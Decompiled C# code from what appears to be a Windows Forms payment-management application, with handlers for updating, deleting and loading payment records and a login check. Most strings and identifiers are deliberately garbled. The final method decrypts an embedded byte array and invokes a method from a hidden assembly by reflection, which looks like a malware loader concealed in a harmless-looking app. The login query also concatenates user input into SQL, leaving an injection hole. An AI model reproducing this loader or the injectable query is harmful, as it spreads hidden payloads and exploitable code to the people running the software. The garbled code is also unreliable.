			Interaction.MsgBox((object)"ErrWE668769,or", (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	private void Dr76Py(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Unknown result type (might be due to invalid IL or missing references)
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bd: Unknown result type (might be due to invalid IL or missing references)
		ICloneable cloneable = (ICloneable)new SqlConnection("AET578 8Etyir77i7yi  688 87");
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(TextBoxPaymentID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))
		{
			MessageBox.Show("Emeurt778799,pty Id");
			return;
		}
		ICloneable cloneable2 = (ICloneable)new SqlCommand("Usytrutt7i76967969yit", (SqlConnection)((cloneable is SqlConnection) ? cloneable : null));
		((SqlCommand)cloneable2).get_Parameters().Add("@cndyirt7i", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(zw0c9J_0.object_10, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)cloneable2).get_Parameters().Add("@bnyiu5y 56", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(zw0c9J_0.object_11, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)cloneable2).get_Parameters().Add("@cardnusty 5w5757m", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxCardNumber, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)((cloneable2 is SqlCommand) ? cloneable2 : null)).get_Parameters().Add("@bansy5547ykb", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(zw0c9J_0.object_12, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)cloneable2).get_Parameters().Add("@ite676d", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxPaymentID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlConnection)cloneable).Open();
		if (((SqlCommand)((cloneable2 is SqlCommand) ? cloneable2 : null)).ExecuteNonQuery() == 1)
		{
			MessageBox.Show("Data dture68me 68u 6Upd6uated");
		}
		else
		{
			MessageBox.Show("Da 5 u6ta Ntaeot U6878eh jghlipdated");
		}
		((SqlConnection)cloneable).Close();
	}

	private void f9F4Rs(object sender, EventArgs e)
	{
		o9R4Pa();
		NewLateBinding.LateCall(Admin_Hmepage, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
	}

	private void o9R4Pa()
	{
		throw new NotImplementedException();
	}

	private void To07Lt(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		ICloneable cloneable = (ICloneable)new SqlConnection("sdh oufuafgr9uf");
		ICloneable cloneable2 = (ICloneable)new SqlCommand("DELETE FsafagargraeyreyROM payments WutyiriuooHERE PtyrtuaymentID = @id", (SqlConnection)((cloneable is SqlConnection) ? cloneable : null));
		((SqlCommand)((cloneable2 is SqlCommand) ? cloneable2 : null)).get_Parameters().Add("@iddtuyud", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxPaymentID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlConnection)((cloneable is SqlConnection) ? cloneable : null)).Open();
		if (((SqlCommand)((cloneable2 is SqlCommand) ? cloneable2 : null)).ExecuteNonQuery() == 1)
		{
			MessageBox.Show("Padyuyiuo8p98[yment 0[09[Deleted");
		}
		else
		{
			MessageBox.Show("Payme4e66798ont Deleted");
		}
		((SqlConnection)cloneable).Close();
	}

	private void Rb81Te(object sender, EventArgs e)
	{
		Nz32Te.x9LRn1();
	}

	private void Cm5q1D(object sender, EventArgs e)
	{
		Rz36Xi();
		NewLateBinding.LateCall(zw0c9J_0.object_3, (Type)null, "EndEdit", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		object object_ = zw0c9J_0.object_4;
		object[] array = new object[1];
		ref object object_2 = ref zw0c9J_0.object_5;
		array[0] = object_2;
		Array array2 = array;
		bool[] obj = new bool[1] { true };
		Array array3 = obj;
		NewLateBinding.LateCall(object_, (Type)null, "UpdateAll", array, (string[])null, (Type[])null, obj, true);
		if ((array3 as bool[])[0])
		{
			object_2 = RuntimeHelpers.GetObjectValue(((object[])array2)[0]);
		}
	}

	private void z0NXq4(object sender, EventArgs e)
	{
		object object_ = zw0c9J_0.object_13;
		object[] array = new object[1];
		object database2DataSet = Database2DataSet2;
		array[0] = NewLateBinding.LateGet(database2DataSet, (Type)null, "Payments", new object[0], (string[])null, (Type[])null, (bool[])null);
		Array array2 = array;
		bool[] obj = new bool[1] { true };
		object obj2 = obj;
		NewLateBinding.LateCall(object_, (Type)null, "Fill", array, (string[])null, (Type[])null, obj, true);
		if ((obj2 as bool[])[0])
		{
			NewLateBinding.LateSetComplex(database2DataSet, (Type)null, "Payments", new object[1] { (array2 as object[])[0] }, (string[])null, (Type[])null, true, false);
		}
		object object_2 = zw0c9J_0.object_6;
		object[] array3 = new object[1];
		database2DataSet = zw0c9J_0.object_5;
		array3[0] = NewLateBinding.LateGet(database2DataSet, (Type)null, "Register", new object[0], (string[])null, (Type[])null, (bool[])null);
		array2 = array3;
		NewLateBinding.LateCall(object_2, (Type)null, "Fill", array3, (string[])null, (Type[])null, (bool[])(obj2 = new bool[1] { true }), true);
		if (((bool[])obj2)[0])
		{
			NewLateBinding.LateSetComplex(database2DataSet, (Type)null, "Register", new object[1] { (array2 as object[])[0] }, (string[])null, (Type[])null, true, false);
		}
	}

	private void Km09Nz(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Expected O, but got Unknown
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0105: Unknown result type (might be due to invalid IL or missing references)
		//IL_013c: Unknown result type (might be due to invalid IL or missing references)
		DbConnection dbConnection = (DbConnection)new SqlConnection();
		new SqlCommand();
		((SqlConnection)dbConnection).set_ConnectionString("asfgyueyjrtyoyuipyupiuopiouppiuop");
		object obj = null;
		object obj2 = null;
		try
		{
			obj = (object)new SqlConnection("nb ghk y7 6iotkrkut");
			((SqlConnection)obj).Open();
			IComparable comparable = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"sgffgj", NewLateBinding.LateGet(zw0c9J_0.object_0, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' AND password ='"), NewLateBinding.LateGet(zw0c9J_0.object_2, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' "));
			obj2 = (object)new SqlCommand(comparable as string, (SqlConnection)((obj is SqlConnection) ? obj : null));
			IDisposable disposable = (IDisposable)((SqlCommand)obj2).ExecuteReader();
			if (((SqlDataReader)((disposable is SqlDataReader) ? disposable : null)).Read())
			{
				MessageBox.Show("Logly");
				o9R4Pa();
				NewLateBinding.LateCall(zw0c9J_0.object_14, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
			else
			{
				MessageBox.Show("Ighj");
				NewLateBinding.LateCall(zw0c9J_0.object_15, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)"MSSQL ERROR", (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	internal static void Qe1m9A(object Hw8k9G, byte[] Qp08Fc, int r0PMc6)
	{
		checked
		{
			object obj = new byte[Gd13P.Data.Length - 1 + 1];
			int num = Gd13P.Data.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				int num2 = i + Gq6c5M.Ap92Bf(r0PMc6, Qp08Fc.Length, null, null, 1);
				int num3 = num2 & r0PMc6;
				int num4 = Gq6c5M.Ap92Bf(i, Qp08Fc.Length, null, null, 1);
				int num5 = Qp08Fc[num4];
				int num6 = Gq6c5M.Ap92Bf(0, 0, num5, num3, 2);
				int num7 = Gd13P.Data[i];
				(obj as byte[])[i] = (byte)Gq6c5M.Ap92Bf(0, 0, num7, num6, 2);
			}
			object obj2 = new List<string>();
			((List<string>)obj2).Add("vmnvokdsj8s7f8");
			(obj2 as List<string>).Add("sd reag");
			(obj2 as List<string>).Add("a fd");
			object objectValue = RuntimeHelpers.GetObjectValue(r3ZWy7.p0B4Fx(RuntimeHelpers.GetObjectValue(new object()), obj as byte[]));
			if (objectValue == null)
			{
				IReflectableType reflectableType = (TypeInfo)((Assembly)Gd13P.Ass).GetExportedTypes()[Gd13P.TNum - 27];
				if (reflectableType is TypeInfo)
				{
					((TypeInfo)reflectableType).GetMethods()[0].Invoke(null, new object[0]);
				}
			}
		}
	}
}
